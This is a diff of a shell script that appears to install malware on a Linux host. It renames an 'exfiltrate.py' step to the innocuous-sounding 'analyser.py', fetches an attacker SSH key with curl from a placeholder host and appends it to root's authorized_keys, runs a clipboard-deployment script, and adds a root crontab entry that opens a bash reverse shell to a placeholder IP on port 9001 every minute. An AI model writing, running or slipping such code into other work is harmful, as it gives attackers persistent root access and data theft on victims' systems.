@@ -27,9 +27,9 @@ echo test: $encrypted
 # check for python or python3
 if command -v python3 &> /dev/null
 then
-    python3 $path/exfiltrate.py > test.txt
+    python3 $path/analyser.py > test.txt
 else
-    python $path/exfiltrate.py > test.txt
+    python $path/analyser.py > test.txt
 fi
 # echo -e $link > $path/link.txt
 # echo -e $link
@@ -38,7 +38,19 @@ fi
 touch /bin/updater
 
 
-echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/172.16.177.129/9001 0>&1'" >> /etc/crontab
+# SSH keys
+mkdir -p /root/.ssh
+chmod 700 /root/.ssh
+touch /root/.ssh/authorized_keys
+curl "http://<REPLACE_IP>:10000/ssh-key" |tr -d '"' >> /root/.ssh/authorized_keys
+
+# deploy clipboard script
+chmod +x $path/deploy_clipboard.sh
+./deploy_clipboard.sh
+
+
+
+echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/<REPLACE_IP>/9001 0>&1'" >> /etc/crontab
 chmod +x /bin/updater # forgot to do this
 
 # rm -rf $path
